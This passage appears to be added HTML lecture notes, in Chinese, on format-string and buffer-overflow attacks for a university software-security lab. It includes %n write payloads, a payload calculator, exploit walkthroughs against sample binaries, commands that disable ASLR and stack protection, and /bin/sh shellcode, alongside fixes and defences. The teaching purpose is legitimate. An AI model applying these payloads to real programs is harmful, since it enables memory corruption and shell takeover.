+  [ RET ][ fmt ][ a1 ][ a2 ][ <span class="n">\xaa\xbb\xcc\xdd%3$n</span> ]
+                 (1)   (2)   (3)
+        <span class="c">└──────────────────────┘</span>
+        <span class="c">等价于 printf("...%3$n", _, _, 0xddccbbaa)</span>
+        <span class="c">→ 往 0xddccbbaa 写入"当前已输出的字符数"</span></pre>
+  <p>这里的"当前已输出字符数" = 前面那 4 个字节的地址本身 = <b>4</b>。所以效果是 <code>*(int*)0xddccbbaa = 4</code>。</p>
+  <div class="box pu">
+    <p><b>任意读 → 任意写，只差一个字母：</b><code>%3$s</code> 改成 <code>%3$n</code>。读和写用的是<b>同一套"把地址塞进格式串 + 移动参数指针"的套路</b>，区别只在最后一个说明符是"读"还是"写"。</p>
+  </div>
+</section>
+
+<!-- 6 -->
+<section id="s6">
+  <h2><span class="num">6</span>写"任意数值"：%[n]c%n</h2>
+  <p>现在能写了，但只能写 <code>4</code>（地址的那 4 个字节）。想写别的数，就得<b>控制"已输出字符数"</b>。杠杆是<b>宽度修饰符</b>：</p>
+  <pre>printf(<span class="s">"\xaa\xbb\xcc\xdd%6c%3$n"</span>);
+<span class="c">//              ↑ 宽度6：输出一个占6字符宽的东西（左边补空格）</span>
+<span class="c">// 已输出 = 4(地址) + 6 = 10</span>
+<span class="c">// → *(int*)0xddccbbaa = 10</span></pre>
+  <div class="box ok">
+    <p><b>通用公式：</b><span class="hl">写入的值 = 地址占的 4 字节 + <code>%nc</code> 里的 n</span>，即 <code>n = 目标值 − 4</code>。</p>
+  </div>
+
+  <div class="mini">
+    <div style="font-weight:600;margin-bottom:8px">Payload 计算器（自己动手试）</div>
+    <div class="ctrl">
+      <label>写入值（十进制）：</label>
+      <input type="number" id="wVal" value="65" style="width:110px">
+      <label>或十六进制：</label>
+      <input type="text" id="wHex" value="0x41" style="width:100px">
+      <label>参数位置 M：</label>
+      <input type="number" id="wM" value="5" style="width:60px">
+      <button onclick="calcPayload()">生成 →</button>
+    </div>
+    <div class="out" id="payOut">点"生成"看结果</div>
+    <div id="payNote" style="margin-top:8px;font-size:13px;color:var(--ink2)"></div>
+  </div>
+
+  <div class="box q">
+    <p><b>现实问题：要写 <code>0x0804a010</code>(134520848) 怎么办？</b> 那就得真输出 1.3 亿个字符……不现实。</p>
+    <p><b>真实 exploit 的做法</b>：
+    <br>· 用 <code>%hn</code>（写 2 字节）或 <code>%hhn</code>（写 1 字节），把一个 4 字节地址拆成 2～4 次写；
+    <br>· 每次写的数值变小 → 输出量可控；
+    <br>· 而且 <b>n 可以叠加</b>：第二次写的值 = 前面所有输出之和，所以写第二个 2 字节时用"差值"即可。
+    <br>课件里只讲一次写 4 字节的最简模型，先理解原理就行。</p>
+  </div>
+</section>
+
+<!-- 7 -->
+<section id="s7">
+  <h2><span class="num">7</span>课件上的两道课堂答题</h2>
+
+  <div class="quiz" id="q1">
+    <div class="qt">课堂答题 1：执行 <code>echo -e "\x88\xec\xff\xbf%61c%5$n"</code> 之后，程序里的 secret 输出什么？为什么是 'A'？</div>
+    <button class="ghost" onclick="tog('q1')">看解析</button>
+    <div class="ans">
+      <p><code>%61c</code> 让输出宽度变成 61，加上最前面地址 <code>\x88\xec\xff\xbf</code> 占的 4 个字符：</p>
+      <pre>已输出字符数 = 4 + 61 = 65</pre>
+      <p><code>%5$n</code> 把 <b>65</b> 写进第 5 个参数（也就是地址 <code>0xbfffec88</code>）指向的内存。写入 4 字节、小端序：</p>
+      <pre>65 00 00 00   → 0x00000041 → 十进制 65 → ASCII 'A'</pre>
+      <p>所以 secret 那块内存变成了 <code>0x41</code>，按字符串打印出来就是 <span class="hl">"A"</span>。</p>
+      <p><b>反过来推：</b>想写 'A'(65)，n = 65 − 4 = <b>61</b>。这就是课件给的 <code>%61c</code>。</p>
+    </div>
+  </div>
+
+  <div class="quiz" id="q2">
+    <div class="qt">课堂答题 2：内存里是 <code>1111</code>，要改成 <code>11A1</code>，<code>%[n]c</code> 里的 n 取多少？</div>
+    <button class="ghost" onclick="tog('q2')">看解析</button>
+    <div class="ans">
+      <p>"1111" 四个字节的 ASCII = <code>31 31 31 31</code>；"11A1" = <code>31 31 41 31</code>。</p>
+      <p>用 <code>%n</code> 一次写 4 字节，得把这 4 字节<b>整体</b>当一个 little-endian 的 32 位整数看：</p>
+      <pre>内存字节(低→高):  31  31  41  31
+写成 dword     : <span class="n">0x31413131</span>
+             = 3×16⁷ + 1×16⁶ + 4×16⁵ + 1×16⁴ + 3×16³ + 1×16² + 3×16¹ + 1×16⁰
+             = <span class="n">826356017</span></pre>
+      <p>再减去地址本身占掉的 4 个字符：</p>
+      <pre>n = 826356017 − 4 = <span class="n">826356013</span></pre>
+      <p>所以 payload 是 <code>echo -e "\x88\xec\xff\xbf%826356013c%5$n"</code>。</p>
+      <div class="box warn" style="margin:10px 0 0">
+        <p><b>两个提醒：</b>① 课件上算出来的数 826356013 其实是<b>已经减过 4 的 n</b>，而按上面展开式严格算 dword 值应是 <b>826356017</b> —— 注意区分"要写的值"和"n"。② 现实中这么大的 n 会输出 8 亿多个字符，不可行；实战用 <code>%hhn</code> 逐字节写，每次最多 255。</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="quiz" id="q3">
+    <div class="qt">课堂遗留问题：<code>echo "%c" | ./qiang</code> 为什么会输出一个 "d"？</div>
+    <button class="ghost" onclick="tog('q3')">看解析</button>
+    <div class="ans">
+      <p>程序里只有 <code>%c</code> 和 <code>%n</code> 会被格式化处理；<code>%n</code> 不产生输出，所以屏幕上那个字符<b>只能是 <code>%c</code> 干的</b>。</p>
+      <p><code>%c</code> 的行为：从参数指针位置取 4 字节整数，<b>只把最低那个字节当 ASCII 码输出</b>。</p>
+      <p>那 4 字节里恰好是残留数据 <code>0x64</code>：</p>
+      <pre>0x64 = 100 = ASCII 'd'</pre>
+      <p>课件那张栈图上标的位置 <code>0x 64</code> 就是这个残留值（前面跑 <code>echo "AAAA1=%p|2=%p…"</code> 时在栈上留下的痕迹）。<b>printf 又不会去检查参数是不是垃圾 —— 给它什么它就打什么。</b></p>
+    </div>
+  </div>
+</section>
+
+<!-- 8 -->
+<section id="s8">
+  <h2><span class="num">8</span>最省事的攻击：DoS（搞崩溃）</h2>
+  <pre><span class="k">int</span> func(<span class="k">char</span> *user) { <span class="k">fprintf</span>(stdout, user); }</pre>
+  <p>如果 <code>user = "%s%s%s%s%s%s%s"</code>：</p>
+  <ol>
+    <li>每个 <code>%s</code> 都从栈上取 4 字节<b>当地址</b>；</li>
+    <li>栈上大部分值<b>不是合法的可读地址</b>（可能是整数、返回地址、随机的栈垃圾）；</li>
+    <li>printf 去访问这些地址 → <b>SIGSEGV，进程崩溃</b>。</li>
+  </ol>
+  <div class="box ok">
+    <p>修复：<code>fprintf(stdout, "%s", user);</code> —— 让用户输入永远当"数据"，不当"格式"。</p>
+  </div>
+</section>
+
+<!-- 9 -->
+<section id="s9">
+  <h2><span class="num">9</span>进阶：用格式化字符串"制造"缓冲区溢出</h2>
+  <p>这是 <b>QPOP 2.53 / bftpd</b> 的真实漏洞模式，课件重点讲了。看这段代码：</p>
+  <pre><span class="k">char</span> outbuf[512], errmsg[512];
+<span class="k">sprintf</span>(errmsg, <span class="s">"Err Wrong command: %400s"</span>, user);  <span class="c">// ① 看起来安全：限制了 400</span>
+<span class="k">sprintf</span>(outbuf, errmsg);                             <span class="c">// ② 致命：errmsg 被当格式串！</span></pre>
+  <div class="box warn">
+    <p>① 里 <code>%400s</code> 确实把 user 截到 400 字符，加上前缀 19 字符 = 419，塞进 512 的 errmsg 没问题。</p>
+    <p>但 ② 把 <b>errmsg 当成了格式字符串</b>！于是 user 里的 <code>%</code> 又活了过来 → 变成了<b>格式化字符串漏洞</b>。</p>
+  </div>
+
+  <h3>算一下怎么溢出</h3>
+  <pre>user = <span class="s">"%497d\x3c\xd3\xff\xbf&lt;nops&gt;&lt;shellcode&gt;"</span>
+
+errmsg = "Err Wrong command: " (19字符) + %497d 展开的 497 个字符 = 516 字符
+                                                    ↓ 写进 outbuf(512)
+                                              516 = 512 + 4  ← 正好多 4 字节！</pre>
+  <p>多出来的 4 字节越过 outbuf 边界，覆盖到<b>保存的 ebp / 返回地址</b>，于是变成一次<b>普通栈溢出攻击</b>，跳转到 NOP 雪橇 + shellcode。</p>
+  <div class="box q">
+    <p><b>NOP 的作用？</b> —— <b>NOP 雪橇（NOP sled）</b>。恶意代码的地址不可能 100% 算准，用一大片 <code>0x90</code>(NOP) 铺在 shellcode 前面，只要返回地址<b>落在这一片 NOP 中的任意位置</b>，CPU 就会一路"滑行"到真正的 shellcode。<b>大幅提高命中率。</b></p>
+  </div>
+  <div class="box tip">
+    <p><b>这一节的思路很值得记住：</b>格式化字符串漏洞不只是"读写内存"，它还能<b>绕过长度检查、制造溢出</b>——因为 <code>%497d</code> 这种"宽度"本质上是在<b>凭空生成输出</b>，程序员以为限定了输入长度，其实输出长度被攻击者接管了。</p>
+  </div>
+</section>
+
+<!-- 10 -->
+<section id="s10">
+  <h2><span class="num">10</span>防御机制</h2>
+  <table>
+    <tr><th>措施</th><th>挡住了什么</th><th>怎么被绕（课件提到）</th></tr>
+    <tr><td><b>正确写法</b><br><code>printf("%s", user)</code></td><td>从根上消除漏洞</td><td>—（最有效）</td></tr>
+    <tr><td><b>Canary（栈金丝雀）</b></td><td>栈溢出覆盖返回地址</td><td>先用格式化串<b>读</b>出 canary 值，溢出时再原样写回；<br>canary 每次运行随机则难度陡增</td></tr>
+    <tr><td><b>ASLR</b></td><td>硬编码地址</td><td>先 dump 内存泄露 secret（如 libc 基址）再算；<br>但地址下次运行会变 → 攻击失效。<br>等级：0 关 / 1 栈、共享库随机（堆不变）/ 2 堆也随机</td></tr>
+    <tr><td><b>DEP / NX</b></td><td>在栈上执行 shellcode</td><td>改走 ROP（用已有代码片段拼）</td></tr>
+  </table>
+  <div class="box tip">
+    <p><b>编译期也帮忙：</b><code>gcc -Wformat -Wformat-security -D_FORTIFY_SOURCE=2</code> 会对 <code>printf(user)</code> 这类写法直接报警告/报错。</p>
+  </div>
+</section>
+
+<!-- 11 -->
+<section id="s11">
+  <h2><span class="num">11</span>顺带：溢出家族（课件后半段）</h2>
+  <div class="grid">
+    <div class="mini">
+      <h3 style="margin-top:0">栈溢出（实验环境）</h3>
+      <p>为了能复现，要先把保护全关：</p>
+      <pre style="font-size:12px">gcc -fno-stack-protector -z execstack -g -o stack stack.c
+sudo sysctl -w kernel.randomize_va_space=0
+sudo chown root stack &amp;&amp; sudo chmod 4755 stack  <span class="c"># chown会清suid，注意顺序</span></pre>
+      <p><b>Task A</b>：gdb 找 buf 地址和 ebp，距离 = 108，返回地址 = ebp+4 → <b>偏移 112</b>。<br>
+      <b>Task B</b>：猜 shellcode 地址（关了 ASLR 后栈起始固定），用 NOP 雪橇兜底。</p>
+    </div>
+    <div class="mini">
+      <h3 style="margin-top:0">Shellcode 要干什么</h3>
+      <p>目标：<code>execve("/bin/sh", argv, 0)</code> 拿一个 shell。</p>
+      <pre style="font-size:12px">eax = 0x0b (11)   <span class="c">; execve 系统调用号</span>
+ebx = "/bin/sh" 的地址
+ecx = argv 数组地址  <span class="c">; argv[0]="/bin/sh", argv[1]=0</span>
+edx = 0
+int 0x80</pre>
+      <p>关键约束：<b>机器码里不能含 <code>\x00</code></b>，否则会被 <code>strcpy</code> 截断。</p>
+    </div>
+    <div class="mini">
+      <h3 style="margin-top:0">堆溢出</h3>
+      <pre style="font-size:12px">char *buf1 = malloc(16);
+char *buf2 = malloc(16);
+while((*(buf1+i)=getchar())!=EOF) i++;  <span class="c">// 无边界</span></pre>
+      <p>buf1 写穿 → 踩到 <b>buf2 的数据</b>，或踩到<b>堆块管理头</b>（fd/bk 指针）→ 可劫持 <code>unlink</code> 实现任意写。目标是"<b>敏感数据</b>"而非返回地址。</p>
+    </div>
+    <div class="mini">
+      <h3 style="margin-top:0">BSS 溢出</h3>
+      <p><code>static</code> 变量放 BSS 段，<b>不在栈上</b>，所以 canary 管不着。</p>
+      <p>两种打法：</p>
+      <ul style="margin:6px 0">
+        <li>覆盖 <code>static char *tmpfile</code> → 程序去写<b>攻击者指定的文件</b>（如 <code>/etc/passwd</code>）</li>
+        <li>覆盖 <code>static int (*funcptr)(const char*)</code> → <b>劫持函数指针</b>，直接控制执行流</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- 12 代码实战 -->
+<section id="s12">
+  <h2><span class="num">12</span>课程代码实战（codes-share-to-class）</h2>
+  <p>课件里出现的每个例子，都能在 <code>codes-share-to-class/codes-share-to-class/</code> 里找到源码。建议按下面顺序自己跑一遍。</p>
+
+  <h3>① 先准备环境（每个实验都要）</h3>
+  <pre>sudo sysctl -w kernel.randomize_va_space=0      <span class="c"># 关 ASLR，地址才固定</span>
+gcc -m32 -fno-stack-protector -z execstack -g -o qiang qiang.c</pre>
+
+  <h3>② 代码地图</h3>
+  <table>
+    <tr><th>文件</th><th>干什么</th><th>对应课件哪一页</th></tr>
+    <tr><td><code>formattingString/write.c</code></td><td><code>%n</code> 一次写 4 字节，踩坏 canary</td><td>"%n" / foo:10204080</td></tr>
+    <tr><td><code>formattingString/dumpStack.c</code></td><td>一串 <code>%08x</code> 把栈倒出来</td><td>查看栈中数据</td></tr>
+    <tr><td><code>formattingString/test.c</code></td><td><code>\x1f\x01\xff\xbf_%08x.%08x|%s|</code> 任意读</td><td>任意读</td></tr>
+    <tr><td><code>formattingString/qiang.c</code></td><td><b>主实验</b>：任意读 + 任意写 secret</td><td>课堂答题 1 / 2</td></tr>
+    <tr><td><code>formattingString/str_fmt_attack.c</code></td><td>真实的"密码错误回显"漏洞</td><td>内存数据窃取与篡改</td></tr>
+    <tr><td><code>formattingString/int_fmt_attack.c</code></td><td>改 <code>unsigned int</code> 型的 secret</td><td>printf("Modify the memory: %n")</td></tr>
+    <tr><td><code>formattingString/savedparameters.c</code></td><td>gdb 看 printf 参数在栈上的位置</td><td>补充讲解 / 四个 push</td></tr>
+    <tr><td><code>bufferoverflow/stack.c</code> + <code>stack_exploit.py</code></td><td>标准栈溢出拿 shell</td><td>Buffer Overflow 举例</td></tr>
+    <tr><td><code>bufferoverflow/shellcode.c</code></td><td>execve("/bin/sh") 的机器码</td><td>Shellcode 举例</td></tr>
+  </table>
+
+  <h3>③ 主实验 <code>qiang.c</code> —— 五步走查</h3>
+  <pre><span class="k">char</span> buf[100];
+<span class="k">char</span> secret[100] = <span class="s">"111122223333"</span>;
+printf(<span class="s">"address of secret is at %p\n"</span>, secret);  <span class="c">// ① 把 secret 地址告诉你</span>
+fgets(buf, <span class="k">sizeof</span>(buf), stdin);
+printf(buf);                                    <span class="c">// ② 漏洞点！用户输入当格式串</span></pre>
+
+  <div class="box q">
+    <p><b>关键：那个 <code>%5$</code> 里的 5 是哪来的？</b></p>
+    <p><b>不是算出来的，是试出来的。</b>因为 printf 的参数区紧挨着 main 的栈帧，你的 <code>buf</code> 落在第几个参数位置，取决于编译器、代码、栈布局 —— 换台机器可能就变了。所以标准手法是先用 <code>AAAA</code> 打标：</p>
+    <pre>echo -e <span class="s">"\x41\x41\x41\x41%p|%p|%p|%p|%p|%p|%p|%p"</span> | ./qiang
+<span class="c"># 看哪一格输出 0x41414141 —— 本例是第 5 个 → 以后就用 %5$</span>
+
+echo <span class="s">"AAAA1=%p|2=%p|3=%p|4=%p|5=%p|6=%p"</span> | ./qiang   <span class="c"># 带编号，更直观</span></pre>
+  </div>
+
+  <div class="grid">
+    <div class="mini">
+      <b>Step 1 · 确认能控制</b>
+      <pre>echo -e <span class="s">"\x88\xec\xff\xbf%5$p"</span> | ./qiang</pre>
+      <p style="font-size:13.5px">输出 <code>0xbfffec88</code>（你塞进去的地址被原样打印）→ 说明参数指针能走到你塞的数据上。</p>
+    </div>
+    <div class="mini">
+      <b>Step 2 · 任意读</b>
+      <pre>echo -e <span class="s">"\x88\xec\xff\xbf%5$s"</span> | ./qiang</pre>
+      <p style="font-size:13.5px">把地址处的内容当字符串打印 → 读出 <code>111122223333</code>。<b>读和写只差一个字母。</b></p>
+    </div>
+    <div class="mini">
+      <b>Step 3 · 任意写（写 4）</b>
+      <pre>echo -e <span class="s">"\x88\xec\xff\xbf%5$n"</span> | ./qiang</pre>
+      <p style="font-size:13.5px">地址本身占 4 个字符 → 写入 <b>4</b>。secret 前 4 字节变成 <code>04 00 00 00</code>。</p>
+    </div>
+    <div class="mini">
+      <b>Step 4 · 写指定值（'A'=65）</b>
+      <pre>echo -e <span class="s">"\x88\xec\xff\xbf%61c%5$n"</span> | ./qiang</pre>
+      <p style="font-size:13.5px">4 + 61 = 65 → 写入 <code>0x00000041</code> → secret 变成 <code>"A111223333"</code>。</p>
+    </div>
+  </div>
+
+  <div class="box pu">
+    <p><b>Step 5 · <code>111122223333 → 11A122223333</code></b>（源码注释里就有答案）：</p>
+    <pre>echo -e <span class="s">"\x88\xec\xff\xbf%826356013c%5$n"</span> | ./qiang</pre>
+    <p>"1111" = <code>31 31 31 31</code>；"11A1" = <code>31 31 41 31</code> → 小端 dword = <code>0x31413131</code> = <b>826356017</b>；
+    减掉地址占的 4 → <b>n = 826356013</b>。</p>
+  </div>
+
+  <h3>④ <code>str_fmt_attack.c</code> —— 有一个容易踩的坑</h3>
+  <pre><span class="k">void</span> handle_failure(<span class="k">char</span> *buf) {
+  <span class="k">char</span> msg[100];
+  <span class="k">snprintf</span>(msg, <span class="k">sizeof</span>(msg), <span class="s">"Invalid Password!!! %s\n"</span>, buf);
+  <span class="k">printf</span>(msg);        <span class="c">// ← 漏洞在这</span>
+}</pre>
+  <div class="box warn">
+    <p><b>坑：</b>你的 payload 前面被自动加了 <code>"Invalid Password!!! "</code> 共 <b>20 个字符</b>。</p>
+    <p>所以 <code>%n</code> 写入的值 = <b>20 + 4(地址) + n</b>，而不是 <code>4 + n</code>。算 payload 时<b>必须把前缀算进去</b>：</p>
+    <pre>echo <span class="s">'AAAA%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p'</span> | ./str_fmt_attack   <span class="c"># 先探测偏移</span>
+echo $(printf <span class="s">"\x38\xa0\x04\x08"</span>)%12$n        | ./str_fmt_attack  <span class="c"># 写入 20+4   = 24</span>
+echo $(printf <span class="s">"\x38\xa0\x04\x08"</span>)%10c%12$n   | ./str_fmt_attack  <span class="c"># 写入 20+4+10 = 34</span></pre>
+    <p>另外注意这里偏移是 <code>%12$</code> 不是 <code>%5$</code> —— 再次说明<b>偏移量一定要自己探</b>。用 <code>echo $(printf ...)</code> 而不是 <code>echo -e</code> 是因为不同 shell 的 <code>-e</code> 行为不一致。</p>
+  </div>
+
+  <h3>⑤ 栈溢出 + shellcode 逐条拆解</h3>
+  <div class="grid">
+    <div class="mini">
+      <b>stack.c 漏洞点</b>
+      <pre><span class="k">char</span> buffer[100];
+strcpy(buffer, str);  <span class="c">// str 最长 300 → 溢出</span></pre>
+      <p>gdb 实测：<code>&amp;buffer = 0xbfffea2c</code>，<code>ebp = 0xbfffea98</code>，差 <b>108</b>；返回地址在 ebp+4 → <b>偏移 112</b>。</p>
+      <p><code>stack_exploit.py</code> 的构造：<code>content[112:116] = ret</code>（小端），前面 300 字节全填 <code>0x90</code>(NOP)，shellcode 放最末尾。</p>
+    </div>
+    <div class="mini">
+      <b>shellcode 机器码拆解</b>
+      <pre>31 c0        xor    eax,eax        <span class="c">; eax = 0</span>
+50           push   eax            <span class="c">; 字符串结尾 \0</span>
+68 2f 2f 73 68 push  <span class="n">"//sh"</span>
+68 2f 62 69 6e push  <span class="n">"/bin"</span>
+89 e3        mov    ebx,esp        <span class="c">; ebx → "/bin//sh"</span>
+50           push   eax            <span class="c">; argv[1] = NULL</span>
+53           push   ebx            <span class="c">; argv[0]</span>
+89 e1        mov    ecx,esp        <span class="c">; ecx → argv</span>
+99           cdq                   <span class="c">; edx = 0  (envp=NULL)</span>
+b0 0b        mov    al,0x0b        <span class="c">; execve = 11</span>
+cd 80        int    0x80           <span class="c">; 发起系统调用</span></pre>
+      <p><b>两条硬约束：</b>① 机器码里<b>不能有 <code>\x00</code></b>，否则 <code>strcpy</code> 会截断（所以 <code>xor eax,eax</code> 而不是 <code>mov eax,0</code>）；② 用 <code>//sh</code> 补到 4 字节对齐。</p>
+    </div>
+  </div>
+</section>
+
+<!-- 13 -->
+<section id="s13">
+  <h2><span class="num">13</span>自测：8 道题检验一下</h2>
+  <div id="quizList"></div>
+</section>
+
+<div class="foot">根据《第2讲 软件安全 2-2》课件整理 · 所有栈地址和数值为示例值，理解原理即可</div>
+</div>
+
+<script>
+/* ---------- 导航高亮 ---------- */
+const links=[...document.querySelectorAll('#nav a')];
+const secs=links.map(a=>document.querySelector(a.getAttribute('href')));
+addEventListener('scroll',()=>{
+  const y=scrollY+90; let idx=0;
+  secs.forEach((s,i)=>{ if(s && s.offsetTop<=y) idx=i; });
+  links.forEach((a,i)=>a.classList.toggle('on',i===idx));
+});
+
+/* ---------- 折叠解析 ---------- */
+function tog(id){document.getElementById(id).classList.toggle('open');}
+
+/* ---------- 0.7 输入检查器 ---------- */
+const SPEC_INFO={
+  'n':{lv:3,name:'%n  （以及 %hn / %hhn）',desc:'把"已输出字符数"写进参数所指地址 → 任意地址写，最危险'},
+  's':{lv:2,name:'%s',desc:'把栈上的值当地址去读字符串 → 任意读，或读到非法地址直接崩溃(DoS)'},
+  'p':{lv:1,name:'%p',desc:'把栈上的值当指针打印 → 泄露栈内容/地址'},
+  'x':{lv:1,name:'%x / %X / %08x',desc:'把栈上的值按十六进制打印 → 泄露栈内容'},
+  'd':{lv:1,name:'%d / %i',desc:'把栈上的值按十进制打印 → 泄露栈内容'},
+  'u':{lv:1,name:'%u',desc:'把栈上的值按无符号十进制打印 → 泄露栈内容'},
+  'c':{lv:1,name:'%c',desc:'取栈上4字节，只把最低1字节当ASCII输出 → 泄露1字节'}
+};
+function tryCheck(){
+  const s=document.getElementById('tryIn').value;
+  const found=[];
+  for(let i=0;i<s.length;i++){
+    if(s[i]!=='%') continue;
+    if(s[i+1]==='%'){ i++; found.push({lv:0,name:'%%',desc:'转义，只打印一个 "%" 字符，安全'}); continue; }
+    let j=i+1, flags='';
+    while(j<s.length && '0123456789$.#-+ hl'.indexOf(s[j])>=0){ flags+=s[j]; j++; }
+    const ch=(s[j]||'').toLowerCase();
+    const info=SPEC_INFO[ch];
+    found.push(info?{lv:info.lv,name:'%'+flags+s[j],desc:info.desc}
+                   :{lv:1,name:'%'+flags+(s[j]||''),desc:'其它说明符，同样会从栈上取参数'});
+    i=j;
+  }
+  if(!found.length){
+    document.getElementById('tryOut').innerHTML=
+      '<span class="good">✓ 安全。</span>输入里没有 %，printf 只会把它当普通文字原样打印。\n'+
+      '（但记住：<b>这只是这一次输入恰好安全</b>，<code>printf(user)</code> 这个写法本身仍然是漏洞。）';
+    return;
+  }
+  const max=Math.max(...found.map(f=>f.lv));
+  const head = max===3?'<span class="bad">☠☠ 极度危险：可以写内存</span>'
+             : max===2?'<span class="bad">☠ 危险：可以任意读 / 让程序崩溃</span>'
+             : max===1?'<span class="em">⚠ 有风险：会泄露栈上数据</span>'
+             : '<span class="good">✓ 安全</span>';
+  let txt=head+'\n\n识别到 '+found.length+' 个说明符：\n';
+  found.forEach((f,k)=>{ txt+='  '+(k+1)+'. '+f.name+'\n     → '+f.desc+'\n'; });
+  txt+='\n<span class="em">原因：printf(user) 把这段输入当成"程序"来执行，\n每一个 % 都会让它从栈上取走 4 个字节。</span>';
+  document.getElementById('tryOut').innerHTML=txt;
+}
+
+/* ---------- 模拟器 ---------- */
+const STACK=[
+  {v:'0xbfffec10',l:'别人的数据（栈垃圾）'},
+  {v:'0x08048568',l:'别人的数据'},
+  {v:'0x41414141',l:'"AAAA" ← 可能是你输入的残留'},
+  {v:'0xbfffebf4',l:'（没传参数，这里是垃圾）'},
+  {v:'0x00000014',l:'← 第2个参数 a = 20'},
+  {v:'0x0000000a',l:'← 第1个参数 i = 10'},
+  {v:'0xbfffeb84',l:'format 串地址'},
+  {v:'0x080484a1',l:'RET 返回地址'}
+];
+const N_PARAM_SLOT=5; // 第1个参数在 STACK 中的下标（从0数）
+let sim={i:0,slot:N_PARAM_SLOT,out:'',done:false,fmt:'',args:[]};
+
+function renderStack(){
+  const el=document.getElementById('stk2');
+  el.innerHTML='';
+  STACK.forEach((row,idx)=>{
+    const isParam = idx<=N_PARAM_SLOT && idx>N_PARAM_SLOT-sim.args.length;
+    const d=document.createElement('div');
+    d.className='srow'+(idx===sim.slot?' hi':'')+(row._used?' used':'')+(row._bad?' bad':'');
+    d.innerHTML='<span class="arrow">'+(idx===sim.slot?'▶':'')+'</span>'+
+      '<span class="addr">slot'+(N_PARAM_SLOT-idx+1>=1&&idx<=N_PARAM_SLOT?'#'+(N_PARAM_SLOT-idx+1):'')+'</span>'+
+      '<span class="val">'+row.v+'</span><span class="lbl">'+(isParam?'':'')+row.l+'</span>';
+    el.appendChild(d);
+  });
+}
+function scanLabel(){
+  const el=document.getElementById('scanPos');
+  if(sim.i>=sim.fmt.length){el.innerHTML='<span style="color:var(--ink3)">（已扫描完毕）</span>';return;}
+  el.innerHTML=sim.fmt.slice(0,sim.i).replace(/</g,'&lt;')+
+    '<span style="background:#fde68a;border-radius:3px">'+(sim.fmt[sim.i]==='%'?sim.fmt.slice(sim.i,sim.i+3):sim.fmt[sim.i]).replace(/</g,'&lt;')+'</span>'+
+    sim.fmt.slice(sim.i+(sim.fmt[sim.i]==='%'?3:1)).replace(/</g,'&lt;');
+}
+function simReset(){
+  const fmt=document.getElementById('fmtIn').value;
+  const args=document.getElementById('argIn').value.split(',').map(s=>s.trim()).filter(Boolean);
+  sim={i:0,slot:N_PARAM_SLOT,out:'',done:false,fmt,args};
+  STACK.forEach(r=>{r._used=false;r._bad=false;});
+  for(let k=0;k<args.length;k++) STACK[N_PARAM_SLOT-k].v='0x'+(+args[k]).toString(16).padStart(8,'0');
+  STACK[N_PARAM_SLOT-args.length] && (STACK[N_PARAM_SLOT-args.length].l='（没传参数，栈垃圾）');
+  document.getElementById('simOut').textContent='';
+  document.getElementById('simNote').innerHTML='';
+  renderStack();scanLabel();
+}
+function stepOnce(){
+  if(sim.i>=sim.fmt.length){sim.done=true;return;}
+  const ch=sim.fmt[sim.i];
+  if(ch!=='%'){ sim.out+=ch; sim.i++; return; }
+  const spec=sim.fmt[sim.i+1];
+  const width=parseInt((sim.fmt.slice(sim.i+1).match(/^(\d+)/)||[0,0])[1],10);
+  const isW=/^\d/.test(sim.fmt[sim.i+1]||'');
+  const letter=isW?sim.fmt[sim.i+1+String(width).length]:spec;
+  const consumed=1+String(width).length+(isW?1:0);   // % + 宽度 + 字母
+  const row=STACK[sim.slot]; row._used=true;
+  const val=parseInt(row.v,16);
+  const provided = sim.args.length - (N_PARAM_SLOT - sim.slot);
+  if(letter==='d'||letter==='u'){ sim.out+=String(val); }
+  else if(letter==='x'||letter==='p'){ sim.out+=val.toString(16).padStart(width||8,'0'); }
+  else if(letter==='c'){ sim.out+=String.fromCharCode(val&0xff); }
+  else if(letter==='s'){
+    row._bad=true;
+    sim.out+='<segfault>';
+    sim.i=sim.fmt.length;
+    document.getElementById('simNote').innerHTML=
+      '<b style="color:var(--red)">💥 崩溃！</b> <code>%s</code> 把 <code>'+row.v+
+      '</code> 当地址去读，这不是一个合法的可读地址 → SIGSEGV。这就是 <b>DoS 攻击</b>的原理。';
+    sim.done=true; return;
+  } else { sim.out+='[?%'+letter+']'; }
+  if(provided<=0){
+    document.getElementById('simNote').innerHTML=
+      '<b style="color:var(--amber)">⚠ 注意：</b>这一格<b>根本不是你传的参数</b>（你只传了 '+
+      sim.args.length+' 个），printf 却照样把它取出来打印了 → <b>栈数据泄露</b>。';
+  }
+  sim.slot--; sim.i+=Math.max(consumed,2);
+}
+function simStep(){ if(!sim.done) stepOnce(); paint(); }
+function simAll(){ let g=0; while(!sim.done && g++<60) stepOnce(); paint(); }
+function paint(){
+  renderStack();scanLabel();
+  const o=document.getElementById('simOut');
+  o.innerHTML=sim.out
+    .replace(/<segfault>/g,'<span class="bad">◀ 访问非法地址，段错误</span>')
+    .replace(/\[\?%(.)\]/g,'<span class="em">[未知说明符 %$1]</span>');
+}
+simReset();
+
+/* ---------- payload 计算器 ---------- */
+function calcPayload(){
+  let v=parseInt(document.getElementById('wVal').value,10);
+  const hex=document.getElementById('wHex').value.trim();
+  if(hex) { const h=parseInt(hex,16); if(!isNaN(h)) v=h; }
+  const M=parseInt(document.getElementById('wM').value,10)||5;
+  if(isNaN(v)||v<4){ document.getElementById('payOut').textContent='值必须 ≥ 4（地址本身要占 4 个字符）'; return; }
+  const n=v-4;
+  const ch = (v>=32&&v<=126)? '  → ASCII 字符 "'+String.fromCharCode(v)+'"' : '';
+  document.getElementById('payOut').innerHTML=
+    '要写入的值 : '+v+'  (0x'+v.toString(16).padStart(8,'0')+')'+ch+'\n'+
+    '地址占输出 : 4 个字符\n'+
+    'n = '+v+' − 4 = <span class="em">'+n+'</span>\n\n'+
+    'payload:\n<span class="good">echo -e "\\\\x88\\\\xec\\\\xff\\\\xbf%'+n+'c%'+M+'$n"</span>';
+  let note='';
+  if(n>200000) note='⚠ n 太大（要输出 '+(n/1e8).toFixed(2)+' 亿个字符），实战不可行 —— 改用 %hn / %hhn 分次写。';
+  else if(n>10000) note='⚠ n 偏大，实际会输出几万个空格，通常改用 %hn（写2字节）或 %hhn（写1字节）。';
+  else note='✓ 可行范围。';
+  document.getElementById('payNote').textContent=note;
+}
+
+/* ---------- 自测题 ---------- */
+const QUIZ=[
